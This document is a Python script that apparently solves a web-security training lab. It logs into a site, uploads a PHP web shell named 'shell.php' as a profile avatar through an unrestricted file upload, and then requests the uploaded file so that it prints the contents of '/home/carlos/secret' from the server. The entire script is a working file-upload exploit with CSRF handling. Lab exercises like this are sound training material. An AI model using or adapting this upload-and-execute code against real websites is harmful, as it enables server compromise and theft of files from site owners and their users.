import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

base_url = input("Enter your lab url: ")
login_path = "/login"
upload_path = "/my-account/avatar"

login_url = urljoin(base_url, login_path)
upload_url = urljoin(base_url, upload_path)

s = requests.Session()

def login(username: str, password: str) -> requests.Response:
    print (f"[+] Logging into {login_url}")
    account = {
        'username': username,
        'password': password
    }

    r_get = s.get(login_url)
    soup = BeautifulSoup(r_get.text, "html.parser")
    csrf_input = soup.find("input", {"name":"csrf"})
    if csrf_input:
        csrf_token = csrf_input['value']
        account['csrf'] = csrf_token
    r_post = s.post(login_url, account)
    if "Log out" in r_post.text:
        print("[+] Logged in successfully!!!")
        return r_post
    else:
        print("[-] Logged in failed!!!")
        return None

def upload_webshell(site: requests.Response):
    print(f"[+] Uploading file to {upload_url}")
    file_data = {
        'avatar': ('shell.php', '<?php echo file_get_contents("/home/carlos/secret"); ?>', 'application/x-php')
    }

    payload = {
        'user': 'wiener'
    }
    
    soup = BeautifulSoup(site.text, "html.parser")
    csrf_input = soup.find("input", {'name':'csrf'})
    if csrf_input:
        csrf_token = csrf_input['value']
        payload['csrf'] = csrf_token
    r_post = s.post(upload_url, files=file_data, data=payload)
    soup = BeautifulSoup(r_post.text, 'html.parser')
    r_get = s.get(urljoin(base_url,soup.find("a")['href']))
    soup = BeautifulSoup(r_get.text, "html.parser")
    file_path = soup.find("img")['src']
    r_get = s.get(urljoin(base_url, file_path))
    print (r_get.text)

if __name__ == '__main__':
    upload_site = login('wiener', 'peter')
    upload_webshell(upload_site)
    